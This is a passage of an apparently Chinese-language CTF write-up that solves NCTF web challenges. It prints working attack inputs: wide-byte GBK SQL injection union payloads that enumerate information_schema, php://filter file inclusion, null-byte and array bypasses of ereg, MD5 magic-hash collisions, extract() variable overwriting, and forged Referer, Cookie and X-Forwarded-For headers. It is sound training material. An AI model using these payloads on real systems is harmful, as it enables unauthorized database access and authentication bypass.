src="./js/jquery-c.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#123;.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-t.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-h.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-i.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-s.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-a.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-_.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-f.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-l.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-4.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-g.7.2.min.js"&gt;&lt;/script&gt;&lt;script src="./js/jquery-&#125;.7.2.min.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match = re.findall(<span class="string">r'jquery-(.)\.'</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>match</span><br><span class="line">[<span class="string">'n'</span>, <span class="string">'c'</span>, <span class="string">'t'</span>, <span class="string">'f'</span>, <span class="string">'&#123;'</span>, <span class="string">'t'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'_'</span>, <span class="string">'i'</span>, <span class="string">'s'</span>, <span class="string">'_'</span>, <span class="string">'a'</span>, <span class="string">'_'</span>, <span class="string">'f'</span>, <span class="string">'l'</span>, <span class="string">'4'</span>, <span class="string">'g'</span>, <span class="string">'&#125;'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = <span class="string">''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> match:</span><br><span class="line">flag = flag + i</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">'nctf&#123;this_is_a_fl4g&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="AAencode"><a href="#AAencode" class="headerlink" title="AAencode"></a>AAencode</h3><p>网址：<a href="http://chinalover.sinaapp.com/web20/aaencode.txt" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web20/aaencode.txt</a></p><p>题目给出了提示js 的aaencode</p><p>用火狐浏览器打开时会出现乱码，首先按alt打开菜单，在查看的文字编码中选择unicode编码方式，就能得到这样的一串字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);</span><br></pre></td></tr></table></figure><p>经过查询这种编码方式解码后是一串js代码，并且可以不用解码直接丢入浏览器的控制台就可以执行，那么我们就直接丢入控制台执行</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>执行后提示变量ωﾟﾉ未被定义，我们定义变量ωﾟﾉ为空，然后再次输入代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功弹出flag</p><h3 id="单身二十年"><a href="#单身二十年" class="headerlink" title="单身二十年"></a>单身二十年</h3><p>网址：<a href="http://chinalover.sinaapp.com/web8/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web8/</a></p><p>页面源代码看到链接</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>但是点击链接自动跳转到no_key_is_here_forever.php</p><p>说明有重定向，果断burp抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h3><p>网址：<a href="http://chinalover.sinaapp.com/web22/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web22/</a></p><p>貌似从谷歌页面访问该页面才能拿到flag</p><p>用burp抓包修改Referer字段值为<a href="https://www.google.com即可拿到flag" target="_blank" rel="noopener">https://www.google.com即可拿到flag</a></p><h3 id="php-decode"><a href="#php-decode" class="headerlink" title="php decode"></a>php decode</h3><p>给出了源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span><span class="params">($ZzvSWE)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $ZzvSWE = gzinflate(base64_decode($ZzvSWE));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($ZzvSWE); $i++) &#123;</span><br><span class="line"></span><br><span class="line">        $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $ZzvSWE;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">eval</span>(CLsI(<span class="string">"+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>一个加密的程序，直接执行就可以</p><p>结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>网址：<a href="http://4.chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener">http://4.chinalover.sinaapp.com/web7/index.php</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看到file参数，很明显的文件包含，直接用php://filter协议读出index.php源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解密后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;asdf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!$_GET[file])&#123;<span class="keyword">echo</span> <span class="string">'&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;'</span>;&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>看到flag</p><h3 id="单身一百年也没用"><a href="#单身一百年也没用" class="headerlink" title="单身一百年也没用"></a>单身一百年也没用</h3><p>网址：<a href="http://chinalover.sinaapp.com/web9/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web9/</a></p><p>还是重定向，抓包</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag藏在响应头部</p><h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="COOKIE"></a>COOKIE</h3><p>网址：<a href="http://chinalover.sinaapp.com/web10/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web10/index.php</a></p><p>提示login first，burp抓包修改cookie中的login=1</p><p>拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h3><p>网址：<a href="http://chinalover.sinaapp.com/web11/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/</a></p><p>页面提示robots.txt</p><p>那我们就访问<a href="http://chinalover.sinaapp.com/web11/robots.txt" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web11/robots.txt</a></p><p>发现提示了源代码和sql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $id = intval($_GET[id]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line">  <span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现intval函数，作用是将字符串中的整数值取出，并且取出的字符串开始部分的整数值，如intval(1024a1)=1024</p><p>intval(a1)=0</p><p>并且有了intval函数，我们就没办法对参数id进行sql注入</p><p>并且服务器对GET的参数id进行过滤，经过php弱类型比较，如果等于1024，则退出程序</p><p>猜测flag就在id为1024里，所以我们思路是让GET的参数id经过intval函数处理的值为1024，但是弱类型比较不等于1024</p><p>我们知道php弱类型比较两个值是先将这两个值转化为同一类型，这里是字符串与整形的弱类型，就将字符串转化为整形，也是将字符串的整数值部分取出，与intval函数类似，除了处理”e”,”.”,”E”</p><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$id = intval(<span class="string">"1024e1"</span>) <span class="comment">//$id=1024</span></span><br><span class="line"><span class="string">"1024e1"</span> == <span class="number">1024</span> <span class="comment">//false</span></span><br><span class="line"><span class="string">"1024e1"</span> == <span class="number">10240</span> <span class="comment">//true</span></span><br><span class="line">$id = intval(<span class="string">"1024.1"</span>) <span class="comment">//$id=1024</span></span><br><span class="line"><span class="string">"1024.1"</span> == <span class="number">1024</span> <span class="comment">//false</span></span><br><span class="line"><span class="string">"1024.1"</span> == <span class="number">1024.1</span> <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么就很明显，我们可以GET参数id=1024e1或者1024.1，都能拿到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="sql-injection-3"><a href="#sql-injection-3" class="headerlink" title="sql injection 3"></a>sql injection 3</h3><p>网址：<a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1" target="_blank" rel="noopener">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p><p>页面显示了执行的sql语句和返回的信息，很明显的注入点在id，数字型注入且从sql语句看id被单引号包裹</p><p>输入id=1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现单引号被转义了，猜测是宽字节注入，输入id=1%df%27%23，正确返回信息，就可以开始注入了</p><p>sql语句就提示了news表，先看一下news表下的列名</p><p>输入id=0%df’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x6e657773 %23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id和title</p><p>输入id=0%df%27%20union%20select%201,group_concat(title)%20from%20news%23</p><p>注出title信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有发现flag</p><p>那再看看其他表</p><p>输入id=0%df%27%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为ctf,ctf2,ctf3,ctf4,news </p><p>看看ctf表下的列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为user,pw</p><p>看看ctf2表下列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id,content</p><p>看看ctf3表下列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为id,email,token</p><p>最后ctf4表下列名</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/25.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看到flag列</p><p>看看flag列下信息</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a></p><p>给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到ereg函数就想起了%00(NULL)截断，而且ereg和strpos处理数组都会返回null值，null不全等于False，所以直接输入nctf[]即可获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/27.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>或者是输入nctf=1%00%23biubiubiu，这里#要用%23代替</p><p>也可以得到flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>网址：<a href="http://chinalover.sinaapp.com/web17/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web17/index.php</a></p><p>依然是md5碰撞</p><p>GET参数a=240610708&amp;b=QNKCDZO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>网址：<a href="http://chinalover.sinaapp.com/web18/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/index.php</a></p><p>看到提示代码<a href="http://chinalover.sinaapp.com/web18/source.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web18/source.php</a></p><p>给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                       <span class="meta">&lt;?php</span></span><br><span class="line">                       extract($_POST);</span><br><span class="line">                       <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                           &lt;div class="alert alert-success"&gt;</span><br><span class="line">                               &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">                           &lt;/div&gt;</span><br><span class="line">                       <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">                   <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>extract函数的作用是将数组中的键名作为变量名，键值作为变量值，那么思路就很清晰了，我们post两个参数pass和thepassword_123，给这两个变量赋值相同，就可以拿到flag了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>网址：<a href="http://chinalover.sinaapp.com/web4/xxx.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web4/xxx.php</a></p><p>提示本地登录才行，利用burp抓包添加X-Forwarded-For:127.0.0.1即可，但这里题目坏了，改了也拿不到flag</p><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>网址：<a href="http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web5/21232f297a57a5a743894a0e4a801fc3/index.html</a></p><p>文件上传题目，因为是html页面，所以先看看源代码</p><p>发现上传到upload.php，而且同时上传了一个隐藏值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;</span><br></pre></td></tr></table></figure><p>访问upload.php，提示我们只能上传jpg,png,gif格式文件</p><p>先试着上传一个png文件</p><figure 